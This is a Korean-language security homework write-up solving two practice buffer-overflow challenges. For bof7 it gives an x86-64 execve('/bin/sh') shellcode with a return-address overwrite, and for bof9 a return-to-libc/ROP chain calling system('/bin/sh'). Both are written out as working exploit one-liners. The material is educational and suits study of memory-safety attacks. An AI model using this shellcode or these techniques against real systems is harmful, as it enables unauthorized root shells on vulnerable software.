# GBC Security_08

## HW #8

### Buffer Overflow
---

### 1. bof7

> `strcpy()`의 취약점을 이용한다.  
> main에서 인자를 받아 vuln에 전달해주고 있다. 

![bof7](https://user-images.githubusercontent.com/47182864/61393145-4d617100-a8fb-11e9-95e4-5b2a9104675a.png)

> main으로 전달되는 인자의 길이에 따라 buf의 주소 값이 달라진다.   
> 인자 전달값이 길어질수록, stack영역은 더 밑으로 내려가기 때문에 주소값이 낮아지고 있다.
> > +) 다른 bof문제에서 위와 같은 문제가 발생하지 않은 이유?   
> > __인자 값이 아닌 입력 스트림으로 input data를 전달하기 때문이다.__
입력스트림으로 받을려면, 프로그램이 이미 시작된 상황이며, 사용자가 얼마의 data를 입력할지 모르기 때문에 heap영역을 사용하고, 그 다음 stack에 복사한다.  
> > > ex) `bof6.c` —> get()로 받는다. main 함수가 시작되고, 해당 함수로 진입한 다음 입력을 받는다. 따라서 __스택에 아무런 영향을 주지 않고, 동적 메모리를 사용한다.__


![bof7-2](https://user-images.githubusercontent.com/47182864/61393142-4cc8da80-a8fb-11e9-874b-ef97a4514072.png)

> `buf`와 `ret`의 사이의 거리는 136byte이기 떄문에, return address까지 136byte만큼의 쓰레기 값이 채워진 후, 우리가 원하는 주소값 8byte를 덮어 씌워야 하기 때문에, 해당 프로그램을 익스플로잇 하기 위해서는 144byte의 인자를 전달해야 한다.   
> 따라서, 144byte의 인자가 전달되었을 때의 `buf` 주소값을 체크한다.
> > `buf` 주소값 : `0x7fffffffe400`

![bof7-3](https://user-images.githubusercontent.com/47182864/61394204-94e8fc80-a8fd-11e9-8e2e-9c9c43821ba7.png)

> payload

```shell
NOP (1byte) + shell code (27byte) + 쓰레기 값 (108byte) + return address (8byte)
```


> 익스플로잇

```shell
./bof7 `python -c "print '\x90'+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*108 + '\x01\xe4\xff\xff\xff\x7f'"`
```
> >`\x90` : `\x90`은 `NOP`코드를 의미한다. return address의 시작이 \x00으로 null이기 때문에, 값이 들어가지 않는 것을 방지하기 위해, `NOP`코드를 1byte넣어주고, return address를 \x01로 고쳐줄 수 있다. (`NOP`코드를 더 늘려줘도 괜찮다. 단, 뒤의 쓰레기값과 리턴 어드레스를 적절하게 고쳐줘야 한다.)

> > `'x'*108` : 전체 144byte에서 nop이 1byte, 쉘코드가 27byte, 리턴 어드레스가 8byte를 차지하고 있기 때문에, 쓰레기값은 남은 108byte를 채워줘야 한다.  

> > `\x01\xe4\xff\xff\xff\x7f` : return address를 16진수로 저장하기 위해서는 \x를 사용하여 리틀엔디안 방식으로 기입해야한다.     
    
> [ result ]

![bof7-4](https://user-images.githubusercontent.com/47182864/61394206-95819300-a8fd-11e9-93b2-f0293921d050.png)

### 2. bof9

#### sum up

* NX bit(DEP) 
	- `NX bit`: 실행권한이 제거된 메모리를 절대 실행하지 않는다는 의미, Never eXecution  
	-  `DEP (Data Execution Prevention)` : 오버플로우 공격을 방어하기 위해 스택에 로드된 쉘코드가
실행되지 않도록 한 것 (윈도우 운영체제)

* NX bit(DEP)가 활성화 되어 있을 경우, 보호된 메모리 영역에서 코드를 실행이 감지되면 Accesss Violation이 발생하면서 프로그램이 종료되어 버린다. 따라서 공격자는 메모리 제어가 가능하더라도 쉘코드를 실행할 수가 없게 된다.

* RTL (Return To Libc)
	- return address 영역에 공유 라이브러리 함수의 주소로 변경해, 해당 함수를 호출하는 방식
	- 즉, 메모리에 미리 적재되어 있는 공유 라이브러리를 이용하여(libc), 바이너리에 원하는 함수가 없어도 공유 라이브러리에서 원하는 함수를 사용할 수 있는 공격 기법이다.  
	- RTL 기법을 이용하여, NX bit(DEP)를 우회할 수 있다.
	
* Gadget
	- stack pointer를 다음 함수의 주소로 이동시켜주는 코드 조각
	- ex) pop, ret과 같은 코드들의 모음

* solving idea
	1. root shell을 탈취하기 위해, 쉘을 실행시켜야 하는데, 가장 간단한 방법은 system() 함수를 이용하는 것이다. system() 함수의 주소값을 구하자.
	2. system() 함수의 주소를 구했으니, 함수 내에 들어갈 파라미터의 주소를 구해야 한다. 쉘을 실행시키기 위해, "/bin/sh"라는 문자열이 들어가야하므로, 해당 문자열의 주소값을 구한다.
	3. 우리가 원하는 형태 system(“/bin/sh”)이므로, Return rdi 레지스터가 system(“/bin/sh”)을 가리키고 있어야 한다. rdi 레지스터에 어떻게 system(“/bin/sh”) 을 전달해야할까? `Rasm2 -b x64 ‘pop rdi ; ret’`
	4. Return Address 영역에 `pop rdi, ret` 코드가 저장된 주소 값을 저장한다.
	5. Return Address를 bin/sh가 있는 주소값으로 더 덮어쓴다.
	6. pop을 하면 rsp에 있는 것을 rdi에 저장
	7. 그럼 위에 있던 bin/sh가 ret에 덮어씌워진다.
		
#### Solving 
> `buf`와 `ret`사이의 메모리 공간 크기를 구한다.

![bof9-1](https://user-images.githubusercontent.com/47182864/61397741-84d51b00-a905-11e9-9c48-c1c679a034de.png)

![bof9-2](https://user-images.githubusercontent.com/47182864/61397744-856db180-a905-11e9-8171-7cb9311d4357.png)

> `system` 함수의 주소값을 찾는다.
> > pwndbg> __p system__

![bof9-system](https://user-images.githubusercontent.com/47182864/61397750-86064800-a905-11e9-8013-0b506a506cd5.png)

> `/bin/sh` 문자열의 주소값을 찾는다.
> > pwndbg> __serarch /bin/sh__

![bof9-bin](https://user-images.githubusercontent.com/47182864/61397745-856db180-a905-11e9-9224-f0210b96b241.png)

> `pop rdi ; ret` gadget의 주소값을 찾는다.  

![bof9-ldd](https://user-images.githubusercontent.com/47182864/61397747-856db180-a905-11e9-8e0e-37186ef58d52.png)

![bof9-rop](https://user-images.githubusercontent.com/47182864/61397749-86064800-a905-11e9-95e3-a51ae9bd21ce.png)

![bof9-garget](https://user-images.githubusercontent.com/47182864/61397746-856db180-a905-11e9-9a15-af66418aceba.png)


> payload

```shell
쓰레기값 (24byte) + pop rdi ; ret 가젯의 주소 (8byte) + /bin/sh 문자열의 주소 (8byte) + system 함수의 주소 (8byte)
```

> 익스플로잇

```shell
(python -c "print 'x'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
```

> [result]

![bof9-result](https://user-images.githubusercontent.com/47182864/61397748-86064800-a905-11e9-8100-c64150dacd7c.png)


---
